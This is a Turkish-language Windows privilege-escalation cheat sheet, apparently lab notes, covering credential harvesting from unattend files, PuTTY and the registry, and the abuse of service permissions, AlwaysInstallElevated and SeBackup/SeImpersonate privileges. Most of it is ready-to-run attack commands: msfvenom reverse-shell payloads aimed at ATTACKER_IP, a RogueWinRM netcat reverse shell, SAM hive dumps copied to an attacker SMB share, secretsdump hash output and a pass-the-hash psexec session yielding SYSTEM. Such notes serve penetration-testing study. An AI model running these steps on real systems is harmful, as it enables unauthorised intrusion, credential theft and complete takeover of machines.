# [TR] Windows-Privesc-Cheat-Sheet

## Parolalar
### Katılımsız Windows Kurulumları
Çok sayıda ana bilgisayara Windows yüklerken, yöneticiler tek bir işletim sistemi görüntüsünün ağ üzerinden birkaç ana bilgisayara dağıtılmasını sağlayan Windows Dağıtım Hizmetleri'ni kullanabilir. Bu tür kurulumlar, kullanıcı etkileşimi gerektirmedikleri için katılımsız kurulumlar olarak adlandırılır. Bu tür kurulumlar, ilk kurulumu gerçekleştirmek için bir yönetici hesabı gerektirir ve bu hesap, aşağıdaki konumlarda makinede depolanabilir:
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

```shell-session
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell Geçmişi
```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Kayıtlı Windows Credential'ları
Windows, diğer kullanıcıların kimlik bilgilerini kullanmamıza izin verir. Bu işlev, bu kimlik bilgilerini sisteme kaydetme seçeneği de sunar. Aşağıdaki komut, kaydedilen kimlik bilgilerini listeler:
```shell-session
cmdkey /list
```

Gerçek şifreleri göremeseniz de, denemeye değer herhangi bir kimlik bilgisi fark ederseniz, bunları aşağıda gösterildiği gibi runas komutu ve /savecred seçeneği ile kullanabilirsiniz.

```shell-session
runas /savecred /user:admin cmd.exe
```

### IIS Configuration
web.config dosyası veritabanı parolaları, veya konfigüre edilmiş oturum açma mekanizmaları içerebilir
- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Credential'ları PuTTY'den Alma

PuTTY, Windows sistemlerinde yaygın olarak kullanılan bir SSH istemcisidir. Kullanıcılar, her seferinde bağlantı parametrelerini belirtmek yerine, IP, kullanıcı ve diğer yapılandırmaların daha sonra kullanılmak üzere saklanabileceği oturumları kaydedebilirler. PuTTY, kullanıcıların SSH şifrelerini kaydetmelerine izin vermez, ancak açık metin kimlik doğrulama bilgilerini içeren proxy yapılandırmalarını kaydeder.

Kaydedilen proxy kimlik bilgilerini almak için, aşağıdaki komutla kayıt defteri anahtarında ProxyPassword'u arayabilirsiniz:

```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Not: Simon Tatham, PuTTY'nin yaratıcısıdır (ve adı yolun bir parçasıdır), şifresini aldığımız kullanıcı adı değildir.

## Diğer

### Zamanlanmış Görevler

Zamanlanmış görevleri listelemek için
```
schtasks
```

Görev hakkında detaylı bilgi için
```
schtasks /query /tn {example task} /fo list /v
```


Kullanıcının örnek task'i düzenleme yetkilerini kontrol etmek için (bir nevi rwx)
```
C:\>icacls c:\tasks\schtask.bat
```

```
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)

```

I - Inherited
F - Full access

Task'i çalıştırmak için  komut
```
schtasks /run /tn vulntask
```

### AlwaysInstallElevated
Windows installer dosyaları (.msi) genelde çalıştıran kullanıcının yetkilerinde çalıştırılır, ancak bu admin olarak çalıştırılacak şekilde güncellenebilir. 

Şu iki registry'nin set edilmesi gerekir
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Sonrasında uygun zararlı .msi dosyası oluşturulur
```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Sonra da bu .msi dosyasi çalıştırılır
```shell-session
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Hatalı Servis Yapılandırmaları

### Windows Servisleri

Servis Kontrol Yöneticisi tarafından yönetilir (SCM). SCM, hizmetlerin durumunu gerektiği gibi yönetmek, herhangi bir hizmetin mevcut durumunu kontrol etmek ve genel olarak hizmetleri yapılandırmak için bir yol sağlamakla görevli bir process'tir.

Her servisin kendine ait SCM tarafından bilgisayar başlatıldığında yürütülen bir executable'ı vardır. 

Örn: apphostsvc servisine dair bilgiler için
```
sc qc apphostsvc
```

```
[SC] QueryServiceConfig SUCCESS 

SERVICE_NAME: apphostsvc 
	TYPE : 20 
	WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START 
		ERROR_CONTROL : 1 NORMAL 
		BINARY_PATH_NAME : C:\Windows\system32\svchost.exe -k apphost 
		LOAD_ORDER_GROUP : 
		TAG : 0 
		DISPLAY_NAME : Application Host Helper Service 
		DEPENDENCIES : 
		SERVICE_START_NAME : localSystem
```

Burada görüldüğü üzere executable BINARY_PATH_NAME parametresinde, onu çalıştıran kullanıcı da SERVICE_START_NAME parametresinde gözükmektedir. 

Hizmetler, kimin hizmeti başlatma, durdurma, duraklatma, durumu sorgulama, yapılandırmayı sorgulama veya yeniden yapılandırma gibi ayrıcalıklara sahip olduğunu belirten İsteğe Bağlı Erişim Kontrol Listesi'ne (DACL) sahiptir. DACL, Process Hacker'dan (bilgisayarınızın masaüstünde mevcuttur) görülebilir:

### Service Executable'da Güvenli Olmayan İzinler

```
sc qc WindowsScheduler
```
```
[SC] QueryServiceConfig SUCCESS 
SERVICE_NAME: windowsscheduler 
	TYPE : 10 WIN32_OWN_PROCESS 
	START_TYPE : 2 AUTO_START 
	ERROR_CONTROL : 0 
	IGNORE BINARY_PATH_NAME : C:\PROGRA~2\SYSTEM~1\WService.exe 
	LOAD_ORDER_GROUP : 
	TAG : 0 
	DISPLAY_NAME : System Scheduler Service
	DEPENDENCIES : 
	SERVICE_START_NAME : .\svcuser1
```

şekilde gördüğümüz üzere C:\PROGRA~2\SYSTEM~1\WService.exe .\svcuser1 tarafından çalıştırılıyor. Şimdi bu dosyanın izinlerini kontrol edelim

```
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
```
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Burada ilginç bir durum var. Everyone grubu modify izinlerine sahip (M). Bu da bu servisi istediğimiz payload ile değiştirme şansını bize veriyor.

exe servis payloadı oluşturup bunu python sunucusu ile hosta gönderelim

### Tırnak İçine Alınmamış Servis Yolları

Eğer ki bir servisin executable'ı tırnak içine alınmadıysa bu da zafiyet doğurabilir

####  Güvenli olan:

```
C:\> sc qc "vncserver" 
[SC] QueryServiceConfig SUCCESS 

SERVICE_NAME: vncserver 
	TYPE : 10 WIN32_OWN_PROCESS 
	START_TYPE : 2 AUTO_START
	ERROR_CONTROL : 0 IGNORE 
	BINARY_PATH_NAME : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service 
	LOAD_ORDER_GROUP : 
	TAG : 0 
	DISPLAY_NAME : VNC Server 
	DEPENDENCIES : 
	SERVICE_START_NAME : LocalSystem
```

#### Güvenliksiz Olan:
```
C:\> sc qc "disk sorter enterprise" 
[SC] QueryServiceConfig SUCCESS 

SERVICE_NAME: disk sorter enterprise 
TYPE : 10 WIN32_OWN_PROCESS 
START_TYPE : 2 AUTO_START 
ERROR_CONTROL : 0 IGNORE 
BINARY_PATH_NAME : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe 
LOAD_ORDER_GROUP : 
TAG : 0 
DISPLAY_NAME : Disk Sorter Enterprise 
DEPENDENCIES : 
SERVICE_START_NAME : .\svcusr2
```

#### Neden Güvenli Değil?
Sistem, tırnak olduğu zaman .exe dosyasının yolunu boşluklar da tırnak içinde olduğundan tam doğru şekilde bilebiliri ancak tırnak yoksa boşluklardan sonra gelenlerin parametre mi yoksa dosya yolu mu olduğunu anlayamaz

Aşağıdaki üç olasılık da olabilir

| Komut                                                | Parametre 1                | Parametre 2                |
| ---------------------------------------------------- | -------------------------- | -------------------------- |
| C:\MyPrograms\Disk.exe                               | Sorter                     | Enterprise\bin\disksrs.exe |
| C:\MyPrograms\Disk Sorter.exe                        | Enterprise\bin\disksrs.exe |                            |
| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |                            |                            |
Dolayısıyla sistem bu üç yolu da dener, Buradan sonrası zaten basit, eğer MyPrograms klasörü içine dosya eklenebilir ise, eklenecek zararlı bir Disk.exe dosyası servis tarafından çalıştırılır ve çalıştıran kullanıcının yetkilerini bize verebilir.

### Güvenli Olmayan Servis İzinleri

acesschk aracılığıyla bir servisin izinleri kontrol edilebilir

```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice 
[0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM 
	SERVICE_QUERY_STATUS 
	SERVICE_QUERY_CONFIG 
	SERVICE_INTERROGATE 
	SERVICE_ENUMERATE_DEPENDENTS 
	SERVICE_PAUSE_CONTINUE 
	SERVICE_START 
	SERVICE_STOP 
	SERVICE_USER_DEFINED_CONTROL 
	READ_CONTROL 
[4] ACCESS_ALLOWED_ACE_TYPE: 
	BUILTIN\Users SERVICE_ALL_ACCESS
```

Görüldüğü üzere `BUILTIN\Users` grubu SERVICE_ALL_ACCESS iznine sahip, yani servisi yeniden yapılandırabiliyor.

Böyle bir durumda zararlı bir .exe hazırlanıp sisteme gönderilebilir. 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe 
nc -lvp 4447
```

Herkese çalıştırma yetkisi vermeyi unutma
```shell-session
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Hizmetin ilişkili yürütülebilir dosyasını ve hesabını değiştirmek için aşağıdaki komutu kullanabiliriz (sc.exe kullanırken eşittir işaretlerinden sonraki boşluklara dikkat edin):
```shell-session
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

sonrasında yapılacak bir stop-start, kodu çalıştırır.
## Tehlikeli İzinleri İstismar Etme

Aşağıdaki komutla kullanıcı yetkilerini öğrenebilirsin
```
whoami /priv
```
Windows sistemlerinde kullanılabilen ayrıcalıkların tam listesi [burada](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) mevcuttur.
İstismar edilebilecek zafiyetler hakkında detaylı bir kaynağı da [Priv2admin](https://github.com/gtworek/Priv2Admin) Github sayfasında bulabilirsin

En yaygınları aşağıdakiler gibidir.
### SeBackup / SeRestore

SeBackup ve SeRestore yetkileri, DACL'yi görmezden gelerek sistemdeki her dosyayı okuma ve yazma yetkisi verir. 

Bu yetkiler kullanıcıya birkaç yoldan yetki yükseltme imkanı sağlar. Bunlardan bir tanesi sistemdeki SAM ve SYSTEM registry hive'larını kopyalamaktır.

Cmd'yi açıp "Run as administrator" dedikten sonra açılan komut satırına:

```
C:\> whoami /priv 

PRIVILEGES INFORMATION 
---------------------- 
Privilege Name                Description                    State 
============================= ============================== ======== SeBackupPrivilege             Back up files and directories  Disabled 
SeRestorePrivilege            Restore files and directories  Disabled 
SeShutdownPrivilege           Shut down the system           Disabled 
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
> Not: Disable olduğuna bakma, varsa o yetkiye sahipsin (?)

SAM ve SYSTEM hash'lerini yedeklemek için aşağıdaki komutları kullanabilirsin


```
reg save hklm\system C:\Users\THMBackup\system.hive 
```
```
The operation completed successfully. 
```
```
reg save hklm\sam C:\Users\THMBackup\sam.hive 
```
```
The operation completed successfully.
```

bu dosyaları kendi bilgisayarımıza atmak için impacket'in sağladığı smbserver.py'ı kullanabiliriz.

```shell-session
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

Hedef makineden dosyaları kendi bilgisayarımızdaki smbserver'a göndeririz

```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\ 
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

Hash'leri almak için
```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```
```
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```


Buradan sonra Pass-the-hash attack ile hedef makineye SYSTEM kullanıcısı olarak gireriz

```
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
```
```

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```


> Not 2: GUI yoksa "Run as administrator yerine aşağıdaki komutları da deneyebilirsin"
> 
> 1. Powershell Üzerinden
> ```
> Start-Process cmd -Verb RunAs
> ```
> 
> ```
> Start-Process powershell -Verb RunAs
> ```
> 
> 2. PsExec ile (Sysinternals)
> ```
> psexec -i -s cmd.exe
> ```
> Bu komut SYSTEM yetkisiyle cmd açar (yöneticiden bile yüksek).
> 
> 3. Runas komutu ile
> ```
> runas /user:Administrator cmd
> ```

### SeImpersonate / SeAssignPrimaryToken

Impersonation, bir kullanıcı adına process veya thread başlatabilme yetkisidir. Bunu bir FTP server örneği ile anlayabiliriz
<img width="920" height="400" alt="6e5768172fbb97d6777dde7e15a3fcfc" src="https://github.com/user-attachments/assets/6d5f66b0-8315-404b-b9f4-6c21131658b0" />
FTP userının tokeni kullanarak bu dosyalara erişmek güvenli bir yöntem değil. Bu nedenle ftp server'ın kullanıcıyı impersonate etmesi gerekir.
<img width="920" height="400" alt="89e74e14454edc10fa2bd541ac359772" src="https://github.com/user-attachments/assets/2be86ad1-628a-4518-9fd6-1a00344576f8" />
Saldırganın yetki yükseltmesi için aşağıdaki adımları takip etmesi gerekir:

1. Kullanıcıların bağlanıp bağlanıp oturum açabileceği bir process oluşturmak.
2. Yetkili kullanıcıların bu zararlı process'e bağlanıp oturum açmaya zorlamanın yolunu bulmak.


Bunun için RogueWinRM aracı kullanılabilir. Bu araç 5985 portunu dinler. Herhangi bir kullanıcı (buna yetkisiz kullanıcılar da dahil) BITS servisi başlattığında, bu servis otomatik olarak 5985 portu ile SYSTEM yetkileri ile bağlantı kurar. 5985 ise genel olarak WinRM servisinin kullanıldığı porttur. WinRM'i ssh'ın powershell hali gibi düşünebiliriz. 

Önce attacker olarak bir portu dinlemeye başlarız
```shell-session
nc -lvp 4442
```

Sonra hedef makinede aşağıdaki gibi bir komut çalıştırırız
```shell-session
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

## Kullanılabilecek Toollar

- WinPEAS
- PrivescCheck
- WES-NG: Windows Exploit Suggester - Next Generation
- Metasploit: multi/recon/local_exploit_suggester

### Zafiyetli Yazılımlar

Bazı yazılım sürümlerinde yetki yükseltme zafiyetleri olabilir. Sistemde yüklü yazılımların sürümlerini kontrol etmek için:
```shell-session
wmic product get name,version,vendor
```
